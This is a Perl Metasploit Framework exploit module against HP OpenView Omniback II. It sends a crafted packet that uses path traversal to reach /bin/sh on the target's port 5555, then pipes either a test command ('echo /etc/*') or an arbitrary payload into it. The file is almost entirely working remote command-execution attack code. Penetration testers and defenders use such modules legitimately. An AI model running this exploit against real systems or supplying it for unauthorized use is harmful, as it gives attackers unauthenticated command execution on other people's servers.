##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::openview_omniback;
use base "Msf::Exploit";
use Pex::Text;
use strict;


my $advanced = { };

my $info =
{
    'Name'  => 'HP OpenView Omniback II Command Execution',
    'Version'  => '$Revision: 1.2 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>',
                   'DiGiT <digit [at] security.is>',      ],
    'Arch'  => [ ],
    'OS'    => [ ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The omniback server port', 5555],
                   },
    'Payload' => {
        'Space'    => 1024,
        'Keys'     => ['cmd'],                
    },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module uses a vulnerability in the OpenView Omniback II
        service to execute arbitrary commands. This vulnerability was
        discovered by DiGiT and his code was used as the basis for this
        module.
    }),
    
    'Refs'  =>  [ 'http://www.securiteam.com/exploits/6M00O150KG.html' ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return $self->CheckCode('Connect');
    }

    my $poof =
        "\x00\x00\x00.2".
        "\x00 a".
        "\x00 0".
        "\x00 0".
        "\x00 0".
        "\x00 A".
        "\x00 28".
        "\x00/../../../bin/sh".
        "\x00\x00".
        "digit ".
        "AAAA\n\x00";
    
    $s->Send($poof);
    $s->Send("echo /etc/*;\n");
    
    my $res = $s->Recv(-1, 5);
    $s->Close;
    
    if ($res =~ /passwd|group|resolv/sm) {
        $self->PrintLine("[*] This system appears to be vulnerable.");
        return $self->CheckCode('Confirmed');
    }
    
    $self->PrintLine("[*] This system does not appear to be vulnerable.");    
    return $self->CheckCode('Safe');
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
    my ($res, $len);
    
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }

    my $poof =
        "\x00\x00\x00.2".
        "\x00 a".
        "\x00 0".
        "\x00 0".
        "\x00 0".
        "\x00 A".
        "\x00 28".
        "\x00/../../../bin/sh".
        "\x00\x00".
        "digit ".
        "AAAA\n\x00";
    
    $s->Send($poof);
    $s->Send($shellcode.";\n");
}


1;

